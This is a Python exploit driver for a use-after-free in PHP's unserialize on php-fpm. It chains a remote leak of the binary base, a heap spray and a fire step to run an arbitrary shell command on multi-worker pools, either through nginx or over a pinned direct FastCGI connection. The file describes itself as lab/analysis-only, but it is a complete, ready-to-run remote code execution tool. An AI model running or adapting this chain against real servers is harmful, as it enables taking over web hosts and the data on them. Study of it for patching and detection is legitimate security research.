#!/usr/bin/env python3
# INDEX: uaf rce across scattered worker pool | fpm | pure | serialize+unserialize | free | scatter or fcgi-pin
"""Fully-remote, offset-free php-fpm RCE on a multi-worker pool.
CVE-2026-109618 / CVE-2026-109619 (unserialize var_hash UAF), php-fpm SAPI.

Extends the single-worker fullchain driver to a real pool (pm=dynamic or
max_children>1) where requests scatter across workers. fpm ASLR is fork-shared
and zend_mm resets the request arena to its post-RINIT baseline each request, so
binbase/executor_globals/libc and the request chunk + spray slot are all
worker-invariant; the chain lands over scattered nginx HTTP unchanged.

Two modes: `scatter` (default) runs over nginx HTTP with an invariance preflight
(chunk-VA + spray-slot stability) and fire retries; `pin` speaks FastCGI
directly to fpm over one persistent FCGI_KEEP_CONN connection so the whole chain
executes on one worker. The transport is swapped by monkeypatch, not by editing
any module. Pure stdlib, safe under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import socket
import struct
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


# Minimal FastCGI client -- one persistent connection = one pinned fpm worker
_FCGI_BEGIN_REQUEST = 1
_FCGI_END_REQUEST = 3
_FCGI_PARAMS = 4
_FCGI_STDIN = 5
_FCGI_STDOUT = 6
_FCGI_RESPONDER = 1
_FCGI_KEEP_CONN = 1


def _fcgi_record(rtype, rid, content=b""):
    """Serialize one or more FastCGI records (content split at 65535)."""
    out = bytearray()
    first = True
    while content or first:
        chunk = content[:65535]
        content = content[65535:]
        out += struct.pack(">BBHHBx", 1, rtype, rid, len(chunk), 0) + chunk
        first = False
        if not content:
            break
    return bytes(out)


def _fcgi_nv(pairs):
    out = bytearray()
    for k, v in pairs.items():
        kb = k.encode()
        vb = v.encode()
        for part in (kb, vb):
            n = len(part)
            out += struct.pack(">I", n | 0x80000000) if n > 127 else bytes([n])
        out += kb + vb
    return bytes(out)


class FcgiPin:
    """A single persistent FastCGI connection; every request on it is served by
    the SAME fpm worker for the connection's lifetime (FCGI_KEEP_CONN)."""

    def __init__(self, host, port, script, timeout=5):
        self.host = host
        self.port = port
        self.script = script
        self.timeout = timeout
        self.s = None
        self.rid = 0
        self._connect()

    def _connect(self):
        self.close()
        self.s = socket.create_connection((self.host, self.port),
                                          timeout=self.timeout)
        self.rid = 0

    def close(self):
        if self.s is not None:
            try:
                self.s.close()
            except Exception:
                pass
            self.s = None

    def post(self, body):
        """POST ``body`` (raw urlencoded bytes) to the sink; return the
        serialize() reflection (FastCGI STDOUT entity body) or None on crash."""
        if self.s is None:
            self._connect()
        self.rid += 1
        rid = self.rid
        pkt = _fcgi_record(_FCGI_BEGIN_REQUEST, rid,
                           struct.pack(">HB5x", _FCGI_RESPONDER, _FCGI_KEEP_CONN))
        params = {
            "SCRIPT_FILENAME": "/var/www/html" + self.script,
            "SCRIPT_NAME": self.script,
            "REQUEST_METHOD": "POST",
            "QUERY_STRING": "",
            "CONTENT_TYPE": "application/x-www-form-urlencoded",
            "CONTENT_LENGTH": str(len(body)),
            "SERVER_PROTOCOL": "HTTP/1.1",
            "GATEWAY_INTERFACE": "CGI/1.1",
        }
        pkt += _fcgi_record(_FCGI_PARAMS, rid, _fcgi_nv(params))
        pkt += _fcgi_record(_FCGI_PARAMS, rid, b"")
        pkt += _fcgi_record(_FCGI_STDIN, rid, body)
        pkt += _fcgi_record(_FCGI_STDIN, rid, b"")
        try:
            self.s.sendall(pkt)
        except Exception:
            self.close()
            return None
        out = bytearray()
        buf = b""
        crashed = False
        while True:
            try:
                while len(buf) < 8:
                    c = self.s.recv(65536)
                    if not c:
                        crashed = True
                        break
                    buf += c
                if crashed:
                    break
                _ver, typ, _r, clen, plen = struct.unpack(">BBHHBx", buf[:8])
                buf = buf[8:]
                while len(buf) < clen + plen:
                    c = self.s.recv(65536)
                    if not c:
                        crashed = True
                        break
                    buf += c
                content = buf[:clen]
                buf = buf[clen + plen:]
                if typ == _FCGI_STDOUT:
                    out += content
                elif typ == _FCGI_END_REQUEST:
                    break
            except Exception:
                crashed = True
                break
        if crashed:
            # the pinned worker died (e.g. the fire SIGSEGV'd after system());
            # drop the socket so the next call re-pins to a fresh worker.
            self.close()
        body_out = bytes(out)
        if b"\r\n\r\n" in body_out:
            body_out = body_out.split(b"\r\n\r\n", 1)[1]
        return body_out if body_out else None


def _install_fcgi_transport(remote_rce_mod, fcgi):
    """Swap remote_rce_mod.send_http for the pinned-FastCGI transport (monkeypatch)."""

    def _send(payload, host=None, port=None, timeout=3):
        remote_rce_mod.req_count += 1
        body = b"cook=" + remote_rce_mod.urlencode_bytes(payload)
        if getattr(remote_rce_mod, "_mw_g_bytes", b""):
            body += b"&" + remote_rce_mod._mw_g_bytes
        resp = fcgi.post(body)
        if resp is None:
            return None
        if b" 500 " in resp[:16] or b" 502 " in resp[:16]:
            return None
        return resp

    remote_rce_mod.send_http = _send


# Invariance preflight (proves scatter-safety on this pool, or diagnoses a break)
def invariance_preflight(host, port, path, samples=16, verbose=True):
    """Probe the request-chunk VA and spray-slot over ``samples`` scattered
    requests. On fork-shared fpm these are worker-invariant, so the whole chain
    is scatter-safe. Returns a dict with the measured spreads and a verdict."""
    rleak = _load("fpm_binbase_leak", "primitives/read_leak/fpm_binbase_leak.py")
    remote_rce = rleak._load_remote_rce()
    remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path

    chunks = {}
    for _ in range(samples):
        H = remote_rce.heap_leak()
        if H:
            c = H & ~0x1FFFFF
            chunks[c] = chunks.get(c, 0) + 1
    if not chunks:
        return {"ok": False, "error": "no heap pointer leaked in preflight"}
    chunk = max(chunks, key=chunks.get)

    # spray-slot sweep: for each sample, which (page,slot) holds a 280-len run
    slots = {}
    SPRAY_LEN = remote_rce.SPRAY_LEN
    # derive candidate run pages from the chunk map once (cheap): reuse the
    # committed find_spray_slot logic by calling it and recording its answer.
    for _ in range(samples):
        S = remote_rce.find_spray_slot(chunk)
        slots[S] = slots.get(S, 0) + 1

    chunk_invariant = (len(chunks) == 1)
    slot_invariant = (len([s for s in slots if s is not None]) == 1 and
                      None not in slots)
    verdict = chunk_invariant and slot_invariant
    if verbose:
        print("[preflight] request-chunk VA spread  : "
              + ", ".join(f"0x{c:x}x{n}" for c, n in chunks.items()))
        print("[preflight] spray-slot S spread       : "
              + ", ".join((f"0x{s:x}x{n}" if s else f"None x{n}")
                          for s, n in slots.items()))
        print(f"[preflight] worker-invariant (scatter-safe): {verdict} "
              f"(chunk={chunk_invariant}, slot={slot_invariant})")
    return {
        "ok": verdict,
        "chunk": chunk,
        "chunk_spread": chunks,
        "slot_spread": slots,
        "chunk_invariant": chunk_invariant,
        "slot_invariant": slot_invariant,
        "reqs": remote_rce.req_count,
    }


# scatter mode: the chain over nginx HTTP + fire retry
def run_scatter(host, port, path, cmd, tries=12, attempts=6, fire_retries=3,
                no_preflight=False, skip_invariance=False, variant="8.5",
                verbose=True):
    erd = _load("fpm_echo_route_driver", "fpm_echo_route_driver.py")

    inv = None
    if not skip_invariance:
        print("=" * 64)
        print("[scatter] invariance preflight")
        inv = invariance_preflight(host, port, path, verbose=verbose)
        if not inv.get("ok"):
            print("[scatter] WARNING: chunk/slot NOT worker-invariant on this "
                  "pool -- scatter mode may be unreliable; consider --pin.")

    last = None
    for fr in range(1, fire_retries + 1):
        print("=" * 64)
        print(f"[scatter] full chain attempt {fr}/{fire_retries}")
        r = erd.echo_route(host, port, path, cmd, variant=variant, tries=tries,
                           attempts=attempts, no_preflight=no_preflight,
                           verbose=verbose)
        last = r
        # ``ok`` is the fire-delivered flag; the fire SIGSEGVs after
        # system() returns, so the real success signal is the out-of-band
        # marker, which the verifier checks. We retry on a hard leak failure.
        if r.get("stage") == "fire":
            break
        print(f"[scatter] attempt {fr} stalled at {r.get('stage')}: "
              f"{r.get('error')}")
    if last is not None:
        last["invariance"] = inv
    return last


# pin mode: entire chain on one worker via a persistent FastCGI connection
def run_pin(fcgi_host, fcgi_port, path, cmd, binbase=None, tries=12,
            attempts=6, fire_retries=4, verbose=True):
    """Pin the whole chain to one worker over a single FCGI connection.

    binbase is leaked remotely over the SAME pinned connection unless supplied.
    On a fire-induced worker crash the connection re-pins to a fresh worker
    (fork-identical geometry), so a retry simply lands on the next worker."""
    fc = _load("fpm_fullchain_rce", "fpm_fullchain_rce.py")
    rleak = _load("fpm_binbase_leak", "primitives/read_leak/fpm_binbase_leak.py")
    rce = _load("fpm_route", "fpm_route.py")

    # supply the per-build 8.5.11 leak constants by attribute assignment (not a
    # file edit) -- rleak ships 8.4.26 defaults.
    rleak.OBJ_CHUNK_OFF = fc.OBJ_CHUNK_OFF
    rleak.ZVAL_PTR_DTOR_OFF = fc.ZVAL_PTR_DTOR_OFF
    rleak.STD_OBJ_HANDLERS_OFF = fc.STD_OBJ_HANDLERS_OFF

    # ----- Phase 1: remote binbase leak, pinned -----
    remote_rce_leak = rleak._load_remote_rce()
    remote_rce_leak.HOST, remote_rce_leak.PORT, remote_rce_leak.PATH = fcgi_host, fcgi_port, path
    fcgi1 = FcgiPin(fcgi_host, fcgi_port, path)
    _install_fcgi_transport(remote_rce_leak, fcgi1)
    if binbase is None:
        print("=" * 64)
        print("[pin] Phase 1: write-free remote binbase leak (pinned worker)")
        binbase, ld = rleak.leak_binbase(remote_rce_leak, leak_tries=tries,
                                         verbose=verbose)
        if binbase is None:
            fcgi1.close()
            return {"ok": False, "stage": "leak", "error": ld.get("error")}
        chunk = ld.get("chunk")
        print(f"[pin] binbase = 0x{binbase:x} chunk = 0x{chunk:x}")
    fcgi1.close()

    # ----- Phase 2: UAF -> RCE, entire chain on ONE pinned worker -----
    # rce imports its OWN engine instance; pin THAT one. Leak/spray/fire run
    # together on the same worker because they share this single connection.
    rce.install_fpm_patches(fcgi_host, fcgi_port, path, binbase, enum=False)
    stats = {}
    for fr in range(1, fire_retries + 1):
        fcgi2 = FcgiPin(fcgi_host, fcgi_port, path)
        _install_fcgi_transport(rce.remote_rce, fcgi2)
        print("=" * 64)
        print(f"[pin] Phase 2 attempt {fr}/{fire_retries}: a7 UAF -> RCE "
              f"(single pinned worker)")
        if not rce.preflight_reflect(fcgi_host, fcgi_port, path):
            fcgi2.close()
            continue
        # chunk=None so the chunk is leaked on THIS pinned worker (self-consistent)
        ok, stats = rce.run_fpm_chain(fcgi_host, fcgi_port, path, binbase, cmd,
                                      chunk=None, attempts=attempts)
        fcgi2.close()
        # fire delivered (request accepted); marker is the real signal (OOB).
        if ok or stats.get("total_reqs"):
            break
    return {"ok": bool(stats.get("spray_addr")), "stage": "fire",
            "binbase": binbase, "stats": stats}


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--mode", choices=["scatter", "pin"], default="scatter")
    ap.add_argument("--host", default="127.0.0.1",
                    help="nginx host (scatter mode)")
    ap.add_argument("--port", type=int, default=8140,
                    help="nginx port (scatter mode)")
    ap.add_argument("--fcgi-host", default="127.0.0.1",
                    help="php-fpm host (pin mode, direct FastCGI)")
    ap.add_argument("--fcgi-port", type=int, default=9140,
                    help="php-fpm port (pin mode, direct FastCGI)")
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--cmd", default="id>/dev/shm/p",
                    help="command to run (<=14 bytes after the GC byte)")
    ap.add_argument("--binbase", default=None,
                    help="optional pre-known php-fpm PIE base, hex")
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--fire-retries", type=int, default=4)
    ap.add_argument("--no-preflight", action="store_true")
    ap.add_argument("--skip-invariance", action="store_true")
    args = ap.parse_args(argv)
    binbase = int(args.binbase, 16) if args.binbase else None

    if args.mode == "scatter":
        print(f"[mw] SCATTER mode via nginx http://{args.host}:{args.port}"
              f"{args.path} (requests round-robin across all workers)")
        r = run_scatter(args.host, args.port, args.path, args.cmd,
                        tries=args.tries, attempts=args.attempts,
                        fire_retries=args.fire_retries,
                        no_preflight=args.no_preflight,
                        skip_invariance=args.skip_invariance)
    else:
        print(f"[mw] PIN mode via direct FastCGI {args.fcgi_host}:"
              f"{args.fcgi_port}{args.path} (one worker, one connection)")
        r = run_pin(args.fcgi_host, args.fcgi_port, args.path, args.cmd,
                    binbase=binbase, tries=args.tries, attempts=args.attempts,
                    fire_retries=args.fire_retries)

    print("=" * 64)
    if r is None:
        print("[mw] no result")
        return 1
    if r.get("stage") == "leak":
        print(f"[mw] FAILED at leak: {r.get('error')}")
        return 2
    print(f"[mw] fire delivered: {r.get('ok')} "
          f"binbase=0x{(r.get('binbase') or 0):x}")
    print("[mw] verify out-of-band: the --cmd marker (the a7 fire SIGSEGVs "
          "after system() returns; check the marker, not the HTTP response).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
